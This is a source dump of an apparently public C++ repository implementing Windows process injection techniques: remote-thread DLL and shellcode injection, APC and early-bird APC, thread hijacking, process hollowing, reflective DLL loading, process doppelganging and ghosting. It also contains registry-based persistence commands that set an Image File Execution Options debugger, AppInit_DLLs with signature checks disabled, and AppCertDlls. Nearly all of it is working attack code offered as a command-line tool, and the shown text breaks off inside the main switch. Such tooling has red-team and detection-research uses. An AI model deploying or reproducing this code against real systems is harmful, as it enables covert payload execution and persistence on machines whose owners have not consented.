Project Path: arc_gmh5225_Process-Injection-Techniques_1jnnytv_

Source Tree:

```txt
arc_gmh5225_Process-Injection-Techniques_1jnnytv_
├── LICENSE
├── Process_Injection_Techniques
│   ├── Process_Injection_Techniques
│   │   ├── Injection.h
│   │   ├── Process_Injection_Techniques.cpp
│   │   ├── Process_Injection_Techniques.vcxproj
│   │   ├── Process_Injection_Techniques.vcxproj.filters
│   │   ├── Struct.h
│   │   └── Utiliti.h
│   └── Process_Injection_Techniques.sln
└── README.md

```

`LICENSE`:

```
MIT License

Copyright (c) 2021 MahmoudZohdy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Process_Injection_Techniques/Process_Injection_Techniques.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31515.178
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Process_Injection_Techniques", "Process_Injection_Techniques\Process_Injection_Techniques.vcxproj", "{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Debug|x64.ActiveCfg = Debug|x64
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Debug|x64.Build.0 = Debug|x64
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Debug|x86.ActiveCfg = Debug|Win32
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Debug|x86.Build.0 = Debug|Win32
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Release|x64.ActiveCfg = Release|x64
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Release|x64.Build.0 = Release|x64
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Release|x86.ActiveCfg = Release|Win32
		{1A2FDD66-71F5-44E0-9F03-4966CA5117DF}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {744811D5-05F7-49CC-B7E6-0E986714A2E5}
	EndGlobalSection
EndGlobal

```

`Process_Injection_Techniques/Process_Injection_Techniques/Injection.h`:

```h
#pragma once


#include <iostream>
#include <Windows.h>
//#include <Ntsecapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <DbgHelp.h>
#include <userenv.h>
#include <ktmw32.h>
#include "Utiliti.h"

using namespace std;

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "KtmW32.lib")



DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName);
DWORD InjectDllUsingSetWindowHook(WCHAR* DllName, WCHAR* ExportedFunctioName);
DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable);
DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath);
DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath);
DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath);



DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID BaseAddress = NULL;
	DWORD BytesWritten;
	FARPROC LoadDllAddress = NULL;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	BaseAddress = VirtualAllocEx(hProcess, BaseAddress, wcslen(DllName)*2 +2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!BaseAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, BaseAddress, DllName, wcslen(DllName)*2+2, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	LoadDllAddress = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
	if (!LoadDllAddress) {
		printf("Failed to Get CreateRemoteThread Address Error Code is0x%x\n", GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadDllAddress, BaseAddress, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	return 0;
}

DWORD InjectDllUsingSetWindowHook( WCHAR* DllName, WCHAR* ExportedFunctioName) {

	HMODULE DllBase = LoadLibraryW(DllName);
	if (!DllBase) {
		printf("Failed To Load Dll %S  Error Code is 0x%x\n", DllName, GetLastError());
		return -1;
	}

	wstring FunNameW(ExportedFunctioName);
	string FunNameA(FunNameW.begin(), FunNameW.end());
	HOOKPROC functionAddress = HOOKPROC(GetProcAddress(DllBase, FunNameA.c_str()));
	if (!functionAddress) {
		printf("Failed To Resolve Function address %S  Error Code is 0x%x\n", ExportedFunctioName, GetLastError());
		return -1;
	}

	HHOOK hookHandle = SetWindowsHookExW(WH_KEYBOARD, functionAddress, DllBase, 0);
	if (!functionAddress) {
		printf("Failed To Set Windows Hool  Error Code is 0x%x\n", GetLastError());
		return -1;
	}

	Sleep(10 * 1000);

	UnhookWindowsHookEx(hookHandle);

	return 0;
}

DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
	if (!ShellCodeSize) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShelCodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	return 0;
}

//the ShellCode should handle that it will runs more that once (number of threads in process)
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;
	DWORD TID = -1;
	vector<DWORD> ThreadIds;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
	if (!ShellCodeSize) {
		return -1;
	}


	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID) {
				ThreadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	// Qeue APC From all threads in the process
	for (DWORD threadId : ThreadIds) {
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		if (!hThread) {
			printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
			continue;
		}

		Status = QueueUserAPC((PAPCFUNC)ShelCodeAddress, hThread, NULL);
		if (!Status) {
			printf("Failed to Queue APC to Thread Is %d in process PID %d  Error Code is0x%x\n", threadId, PID, GetLastError());
		}

		Sleep(1000 * 2);
		CloseHandle(hThread);
	}
}

DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName) {

	PROCESS_INFO ProcInfo;
	DWORD Status = StartExecutable(ExecutablePath, &ProcInfo,CREATE_SUSPENDED);
	if (!Status) {
		return -1;
	}

	Status = InjectUsingAPC(ProcInfo.PID, ShellCodeFileName);

	ResumeProcess(ProcInfo.MainThreadHandle);
	return Status;
}

//TODO If no TLS CallBack in process Create New Section For it
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* ExecutablePath) {
	PROCESS_INFO ProcessInfo;
	DWORD Status = FALSE;
	MODULE_INFO ModuleInfo;
	DWORD dwContinueStatus = DBG_CONTINUE; // exception continuation 
	DEBUG_EVENT DebugEv;

	if (PID != 0) {
		ProcessInfo.MainThreadHandle = NULL;
		ProcessInfo.PID =PID;
	}
	else {
		Status = StartExecutable(ExecutablePath, &ProcessInfo, DEBUG_PROCESS);
		if (!Status) {
			return -1;
		}
	}

	WaitForDebugEvent(&DebugEv, INFINITE);
	ModuleInfo.MainModuleAddress = (BYTE*)DebugEv.u.CreateProcessInfo.lpBaseOfImage;

	BYTE* LocalCopyOfMainModule = new BYTE[500];
	HANDLE hProcess = DebugEv.u.CreateProcessInfo.hProcess;

	Status = ReadProcessMemory(hProcess, ModuleInfo.MainModuleAddress, LocalCopyOfMainModule, 500, 0);
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_NT_HEADERS imageNTHeaders = {};
	dosHeader = (PIMAGE_DOS_HEADER)LocalCopyOfMainModule;
	imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)LocalCopyOfMainModule + dosHeader->e_lfanew);
	DWORD Size = imageNTHeaders->OptionalHeader.SizeOfImage;

	ModuleInfo.MainModuleSize = Size;

	/*sleep for 2 second to let the process start
	Sleep(2000);

	GetMainModuleInfo(ProcessInfo.PID, &ModuleInfo);*/

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
	if (!ShellCodeSize) {
		return -1;
	}

	Status = ChangeTheTLSCallBackFunctionInRemoteProcess(ProcessInfo.PID, &ModuleInfo, ShellCode, ShellCodeSize);
	
	CloseHandle(DebugEv.u.CreateProcessInfo.hFile);
	Status = DebugActiveProcessStop(PID);
	if (!Status) {
		printf("Faile to Deattach From Process Error Code is 0x%x\n", GetLastError());
		Status = -1;
	}
	else Status = 0;

	return Status;
}

DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
	if (!ShellCodeSize) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	CONTEXT ThreadContext;

	memset(&ThreadContext, 0, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_ALL;

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID ) {

				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
				if (!hThread) {
					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					continue;
				}
				
				Status = SuspendThread(hThread);
				if (Status ==-1) {
					printf("Failed to Suspend Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					CloseHandle(hThread);
					continue;
				}
				
				if (GetThreadContext(hThread, &ThreadContext))
				{
					printf("ShellCode addr  %p", ShelCodeAddress);
#if _WIN64			
					ThreadContext.Rip = (DWORD64)ShelCodeAddress;
#else
					ThreadContext.Eip = (DWORD64)ShelCodeAddress;
#endif
					if (!SetThreadContext(hThread, &ThreadContext)) {
						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					Status = ResumeThread(hThread);
					if (Status == -1) {
						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					CloseHandle(hThread);
					return 0;
				}

				printf("Failed to Get Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
				CloseHandle(hThread);
			}
			
		} while (Thread32Next(snapshot, &threadEntry));
	}

	return -1;
}

//Crashes With Some 64bit Process (like svchost.exe,...)
DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable)
{
	PROCESS_INFO ProcessInfo;
	DWORD Status = FALSE;

	Status = StartExecutable(TargetExecutable, &ProcessInfo, CREATE_SUSPENDED);
	if (!Status) {
		return -1;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessInfo.PID);

	PEBmy* pPEB = ReadRemotePEB(hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(hProcess, pPEB->ImageBaseAddress);

	BYTE * SourceFileData = ReadDataFromFile(SourceExecutable);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);

	PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD64 dwResult = NtUnmapViewOfSection(hProcess, pPEB->ImageBaseAddress);
	if (dwResult)
	{
		printf("Error unmapping section 0x%x\r\n",GetLastError());
		return -1;
	}

	PVOID pRemoteImage = VirtualAllocEx(hProcess, pPEB->ImageBaseAddress, pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed 0x%x\r\n",GetLastError());
		return -1;
	}

	DWORD64 dwDelta = (DWORD64)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)pPEB->ImageBaseAddress;

	if (!WriteProcessMemory(hProcess, pPEB->ImageBaseAddress, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
		printf("Error writing process memory 0x%x\r\n", GetLastError());

		return -1;
	}

	for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((DWORD64)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], 
								pSourceImage->Sections[x].SizeOfRawData, 0)) 
		{
			printf("Error writing process memory 0x%x\r\n", GetLastError());
			return -1;
		}
	}

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char pSectionName[] = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD64 dwBuffer = 0;
					BOOL bSuccess;
					bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
												&dwBuffer, sizeof(DWORD64), 0);
					if (!bSuccess)
					{
						printf("Error reading memory  0x%x\r\n", GetLastError());
						continue;

					}
					dwBuffer += dwDelta;
					bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
												&dwBuffer, sizeof(DWORD64), 0);
				
					if (!bSuccess) {
						printf("Error writing memory  0x%x\r\n", GetLastError());
						continue;
					}
				}
			}

			break;
		}

	//DWORD64 dwEntrypoint = CopyAndFixRelocationForPEfileToRemoteProcess(hProcess, (DWORD64)pPEB->ImageBaseAddress, SourceFileData);

	DWORD64 dwEntrypoint = (DWORD64)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(ProcessInfo.MainThreadHandle, pContext))
	{
		printf("Error getting context Erro Code 0x%x\r\n",GetLastError());
		return -1;
	}
#if _WIN64			
	pContext->Rcx = (DWORD64)dwEntrypoint;
#else
	pContext->Eax = dwEntrypoint;
#endif

	if (!SetThreadContext(ProcessInfo.MainThreadHandle, pContext))
	{
		printf("Error setting context Error Code 0x%x\r\n",GetLastError());
		return -1;
	}

	if (!ResumeThread(ProcessInfo.MainThreadHandle))
	{
		printf("Error resuming thread Error Code 0x%x\r\n",GetLastError());
		return -1;
	}

	return 0;
}


//Persestance
DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart) {

	BOOL Status = 0;
	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
	wstring wsTargetProcess = TargetProcess;
	wstring wsSourceProcessToStart = SourceProcessToStart;
	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v GlobalFlag /t REG_DWORD /d 512";

	PROCESS_INFO info;
	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";
	
	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v Debugger /t REG_SZ /d " + wsSourceProcessToStart;
	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	return 0;
}

//Does not work When Secure Boot is ON
DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName) {

	BOOL Status = 0;
	PROCESS_INFO info;

	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	wstring wsDLLName = DLLName;

	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";

	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v AppInit_DLLs /t REG_SZ /d " + wsDLLName + L" /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";

	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}
	return 0;
}

DWORD InjectUsingAppCertDlls(WCHAR* DLLName) {

	BOOL Status = 0;
	PROCESS_INFO info;

	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls";
	wstring wsDLLName = DLLName;

	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v AppCert.dll /t REG_SZ /d " + wsDLLName + L" /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	return 0;
}

// can inject 64bit in 64bit, 64bit in 32bit but 32bit in 32bit work only on 32bit windows
DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath) {

	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	_NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
	_NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	_NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");

	BYTE* PayloadData = ReadDataFromFile(PayloadPath);

	DWORD PayloadSize = GetSizeOfFile(PayloadPath);

	WCHAR DummyName[MAX_PATH] = { 0 };
	WCHAR TempPath[MAX_PATH] = { 0 };
	DWORD size = GetTempPathW(MAX_PATH, TempPath);
	GetTempFileNameW(TempPath, L"TH", 0, DummyName);

	HANDLE hSection = GetSectionHandleFromFileThenDeleteFileOnClose(DummyName, PayloadData, PayloadSize);
	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
		return -1;
	}
	
	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
	if (Status == -1) {
		return -1;
	}

	return 0;

}

// your Dll Should Depend on Kernel32 and ntdll.dll only (for stability, you can resolve all the API you need using GetProcAddress and LoadLibrary)
DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath) {
	HANDLE hFile = NULL;
	DWORD Status = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = PID;

	hFile = CreateFile(DllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Failed to open the DLL file  Error Code %x\n", GetLastError());
		return -1;
	}

	dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
	}

	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer) {
		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
		return -1;
	}

	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
		printf("Failed to alloc a buffer!");
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (!hProcess) {
		printf("Failed to open the target process  Error Code %x\n", GetLastError());
		return -1;
	}

	Status = LoadRemoteLibraryR(hProcess, (BYTE*)lpBuffer, NULL);
	if (Status == -1) {
		return -1;
	}

	//WaitForSingleObject(hModule, -1);

	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		CloseHandle(hProcess);

	return 0;
}

DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath) {

	BYTE* PayloadData = ReadDataFromFile(PayloadPath);

	DWORD PayloadSize = GetSizeOfFile(PayloadPath);

	HANDLE hSection = MakeTransactedSection(TargetProcessName, PayloadData, PayloadSize);
	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
		return -1;
	}
	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
	if (Status == -1) {
		return -1;
	}

	return 0;
}
```

`Process_Injection_Techniques/Process_Injection_Techniques/Process_Injection_Techniques.cpp`:

```cpp
// Process_Injection_Techniques.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Injection.h"
#include "Utiliti.h"

using namespace std;

int wmain(int argc,WCHAR* argv[])
{
    DWORD Result = 0;
    int InjectionType;

    /*Result = InjectUsingProcessGhosting(argv[1], argv[2]);  // InjectUsingProcessGhosting   InjectUsingProcessDoppelGanging
    if (Result == -1) {
        printf("Injection Failed\n");
    }
    else {
        printf("Injection Succeeded\n");
    }
    system("pause");
    return 0;*/

	if (argc < 3) {
		PrintUsage();
		return 0;
	}
	ParseCommandLineArgument(argc, argv);
    InjectionType = _wtoi(argv[1]);
    switch (InjectionType) {
    case 1:
        Result = InjectDllUsingCreateRemoteThread(ProcessID, DLLPath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 2:
        Result = InjectDllUsingSetWindowHook(DLLPath, ExportFunctionName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 3:
        Result = InjectShellCodeInProcess(ProcessID, ShellCodePath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 4:
        Result = InjectUsingAPC(ProcessID, ShellCodePath);
        if (Result == -1) {
